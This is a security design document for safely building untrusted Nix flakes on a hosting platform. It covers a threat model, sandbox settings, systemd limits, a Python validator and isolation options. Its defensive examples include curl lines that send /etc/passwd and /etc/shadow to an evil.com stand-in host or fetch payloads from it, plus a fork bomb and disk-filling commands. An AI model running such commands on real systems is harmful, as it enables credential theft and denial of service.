# Security Considerations for Building Untrusted Nix Flakes

This document analyzes the security implications of allowing users to submit Nix flakes to Hop3 for building applications.

## Threat Model

When a user submits a `flake.nix` to Hop3, malicious code could attempt to:

1. **Read sensitive data** from the build host (secrets, configs, other apps)
2. **Modify the system** (install backdoors, modify other apps)
3. **Exfiltrate data** (send stolen data to external servers)
4. **Denial of service** (resource exhaustion, fork bombs)
5. **Supply chain attacks** (poison builds, inject malware into outputs)

---

## Nix's Built-in Sandbox

Nix has a build sandbox (enabled by default on Linux) that provides significant protection:

| Protection | What it does |
|------------|--------------|
| **Filesystem isolation** | Build only sees declared inputs + temp directory |
| **Network isolation** | No network access during build (by default) |
| **Read-only /nix/store** | Cannot modify existing packages |
| **No access to $HOME** | Cannot read user files |
| **No access to /etc** | Cannot read system config |
| **No access to /tmp** | Gets its own temp directory |

A `buildPhase` or `runCommand` with malicious shell code runs **inside the sandbox** with these restrictions.

---

## Attack Vectors and Mitigations

### 1. Evaluation-time Attacks

Nix evaluates flakes **before** the sandbox is active. Some builtins can be exploited:

```nix
# DANGEROUS: Runs during evaluation, not in sandbox!
let
  # Read files outside the store
  stolen = builtins.readFile /etc/passwd;

  # Execute arbitrary commands (if enabled)
  exec = builtins.exec [ "curl" "https://evil.com/?data=${stolen}" ];

  # Get environment variables
  home = builtins.getEnv "HOME";
in
# ...
```

**Mitigations:**

| Setting | Effect |
|---------|--------|
| `pure-eval = true` | `builtins.getEnv` returns empty, `builtins.currentTime` is fixed |
| `restrict-eval = true` | Blocks `builtins.readFile` on paths outside store/flake |
| `allow-unsafe-native-code-during-evaluation = false` | Blocks `builtins.exec` (default) |

### 2. Import From Derivation (IFD)

IFD allows running builds during evaluation, which can be exploited:

```nix
let
  # This builds a derivation during evaluation
  generatedCode = import (pkgs.runCommand "generate" {} ''
    # This shell code runs during evaluation!
    curl https://evil.com/payload.nix > $out
  '');
in
generatedCode
```

**Mitigation:**

```ini
allow-import-from-derivation = false
```

### 3. Impure Derivations

Derivations can explicitly break the sandbox:

```nix
stdenv.mkDerivation {
  name = "evil";
  __impure = true;  # Breaks sandbox!

  buildPhase = ''
    # Now has full system access
    cat /etc/shadow > /tmp/stolen
    curl https://evil.com/upload -d @/tmp/stolen
  '';
}
```

**Mitigation:** Validate flakes and reject any containing `__impure`.

### 4. Data Exfiltration via Inputs

Flake inputs are fetched before evaluation restrictions apply:

```nix
{
  inputs = {
    # Attempt to encode data in URL (limited effectiveness)
    tracker.url = "https://evil.com/track?v=1";
  };
}
```

**Mitigations:**
- `builtins.getEnv` returns empty in pure mode (can't encode runtime data)
- Monitor/restrict outbound network at system level
- Use allowlisted input sources

### 5. Binary Cache Poisoning

A flake can request untrusted binary caches:

```nix
{
  nixConfig = {
    substituters = [ "https://evil-cache.com" ];
    trusted-public-keys = [ "evil-cache.com-1:AAAA..." ];
  };
}
```

**Mitigation:**

```ini
accept-flake-config = false
```

This ignores `nixConfig` from the flake entirely.

### 6. Resource Exhaustion

Malicious builds can attempt denial of service:

```nix
buildPhase = ''
  # Fork bomb
  :(){ :|:& };:

  # Fill disk
  dd if=/dev/zero of=bigfile bs=1G count=1000

  # Memory exhaustion
  python -c "x = ' ' * (10**12)"

  # Infinite loop
  while true; do :; done
'';
```

**Mitigations:**
- systemd resource limits (see below)
- Build timeouts
- Disk quotas

### 7. Sandbox Escape Attempts

While rare, sandbox escapes have existed. Defense in depth is essential.

**Mitigations:**
- Keep Nix updated
- Run builds in isolated VM/container
- Use separate build user with minimal privileges

---

## Recommended Nix Configuration

For building untrusted flakes, create a restrictive `nix.conf`:

```ini
# /etc/nix/nix.conf (or per-build config)

# === Mandatory Sandbox ===
sandbox = true
sandbox-fallback = false

# === Evaluation Restrictions ===
pure-eval = true
restrict-eval = true
allow-import-from-derivation = false
allow-unsafe-native-code-during-evaluation = false

# === Ignore Flake Config ===
accept-flake-config = false

# === Binary Cache Restrictions ===
substituters = https://cache.nixos.org
trusted-substituters =
trusted-public-keys = cache.nixos.org-1:6NCHdD59X431o0gWypbMrAURkbJ16ZPMQFGspcDShjY=

# === Resource Limits ===
max-jobs = 1
cores = 2
```

---

## systemd Resource Limits

Run the build service with strict limits:

```ini
[Service]
# Memory limit
MemoryMax=4G
MemorySwapMax=0

# CPU limit (200% = 2 cores)
CPUQuota=200%

# Process limit (prevents fork bombs)
TasksMax=1000

# Timeout
TimeoutSec=3600

# No new privileges
NoNewPrivileges=true

# Filesystem restrictions
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true
ReadWritePaths=/nix/store /tmp/nix-build

# Network restrictions (optional, may break fetching)
# PrivateNetwork=true
```

---

## Flake Validation

Before building, validate the flake for obvious issues:

```python
import re
from pathlib import Path

DANGEROUS_PATTERNS = [
    (r"__impure\s*=\s*true", "Impure derivations not allowed"),
    (r"builtins\.exec\b", "builtins.exec not allowed"),
    (r"builtins\.readFile\s+/", "Reading absolute paths not allowed"),
    (r"builtins\.getEnv\b", "builtins.getEnv not allowed in pure mode"),
    (r"substituters\s*=", "Custom substituters not allowed"),
    (r"trusted-public-keys\s*=", "Custom cache keys not allowed"),
    (r"trusted-substituters\s*=", "Custom trusted substituters not allowed"),
]


def validate_flake(flake_dir: Path) -> list[str]:
    """Check flake for security issues before building."""
    issues = []

    for nix_file in flake_dir.rglob("*.nix"):
        content = nix_file.read_text()

        for pattern, message in DANGEROUS_PATTERNS:
            if re.search(pattern, content):
                issues.append(f"{nix_file.name}: {message}")

    return issues


def is_flake_safe(flake_dir: Path) -> bool:
    """Return True if flake passes security checks."""
    issues = validate_flake(flake_dir)
    if issues:
        for issue in issues:
            print(f"Security issue: {issue}")
        return False
    return True
```

**Note:** This is a first-pass filter. Obfuscated code could bypass pattern matching. The Nix configuration restrictions are the real security boundary.

---

## Defense in Depth: Isolated Build Environments

For maximum security, don't build on the production host.

### Option A: Separate Build User

```
hop3 (orchestrator)
  └── Cannot run nix-build directly

hop3-builder (unprivileged)
  └── Runs nix-build in sandbox
  └── No network access (PrivateNetwork=true)
  └── Cannot access hop3's files
```

### Option B: Ephemeral Build VM

```
┌─────────────────────────────────────────────┐
│  Hop3 Server                                │
│                                             │
│  1. Receive flake from user                 │
│  2. Spawn ephemeral VM                      │
│     ┌─────────────────────────────────┐     │
│     │  Build VM                       │     │
│     │  - Minimal NixOS                │     │
│     │  - No secrets                   │     │
│     │  - No network (or restricted)   │     │
│     │  - Runs: nix build              │     │
│     │  - Returns: store path          │     │
│     └─────────────────────────────────┘     │
│  3. Copy result to host                     │
│  4. Destroy VM                              │
│                                             │
└─────────────────────────────────────────────┘
```

Tools for this:
- **microvm.nix**: Lightweight VMs with shared /nix/store
- **NixOS containers**: systemd-nspawn based
- **Firecracker**: Micro-VMs (used by AWS Lambda)

### Option C: Remote Build Machine

Delegate builds to a dedicated machine:

```ini
# nix.conf on hop3 server
builders = ssh://nix-builder@build.internal x86_64-linux - 4 1 big-parallel
```

The build machine:
- Has no access to production data
- Can be rate-limited and monitored
- Can be periodically wiped/rebuilt

---

## Network Security

### During Fetch Phase

Nix needs network access to fetch flake inputs. Options:

1. **Allow all** (least secure): Flake can fetch from anywhere
2. **Proxy with allowlist**: Only permit known sources (github.com, cache.nixos.org)
3. **Pre-fetch inputs**: Download inputs separately, build offline

### During Build Phase

The sandbox blocks network by default. If a derivation needs network (rare, discouraged):

```nix
stdenv.mkDerivation {
  # DON'T allow this for untrusted builds!
  __noChroot = true;  # Disables sandbox
}
```

**Policy:** Reject any derivation requiring network access during build.

---

## Monitoring and Auditing

### Build Logs

Capture and review build output:

```bash
nix build .#package 2>&1 | tee /var/log/hop3/builds/${app_name}.log
```

### Suspicious Activity Detection

Monitor for:
- Builds taking unusually long
- High memory/CPU usage
- Unexpected network connections
- Large output sizes

### Store Path Verification

After build, verify the output:

```bash
# Check output size
du -sh /nix/store/xxx-app

# Check for suspicious files
find /nix/store/xxx-app -name "*.sh" -exec cat {} \;

# Verify no setuid binaries
find /nix/store/xxx-app -perm /4000
```

---

## Summary: Security Checklist

### Nix Configuration
- [ ] `sandbox = true`
- [ ] `sandbox-fallback = false`
- [ ] `pure-eval = true`
- [ ] `restrict-eval = true`
- [ ] `allow-import-from-derivation = false`
- [ ] `accept-flake-config = false`

### Flake Validation
- [ ] Reject `__impure`
- [ ] Reject `__noChroot`
- [ ] Reject custom substituters
- [ ] Scan for dangerous builtins

### Resource Limits
- [ ] Memory limit (MemoryMax)
- [ ] CPU limit (CPUQuota)
- [ ] Process limit (TasksMax)
- [ ] Build timeout

### Isolation
- [ ] Separate build user
- [ ] Consider build VM/container
- [ ] Network restrictions during build

### Monitoring
- [ ] Capture build logs
- [ ] Alert on resource abuse
- [ ] Verify build outputs

---

## Risk Assessment

| Attack | Sandbox Protection | With Recommended Config | With Build VM |
|--------|-------------------|------------------------|---------------|
| Read /etc/passwd | Blocked | Blocked | Blocked |
| Read $HOME | Blocked | Blocked | Blocked |
| Network during build | Blocked | Blocked | Blocked |
| builtins.exec | Disabled by default | Blocked | Blocked |
| IFD attacks | Partial | Blocked | Blocked |
| __impure | Requires opt-in | Rejected | Rejected |
| Resource exhaustion | Not protected | Limited | Isolated |
| Sandbox escape (0-day) | Vulnerable | Vulnerable | Contained |

**Conclusion:** With proper configuration, building untrusted flakes is reasonably safe. For high-security environments, use an isolated build VM.
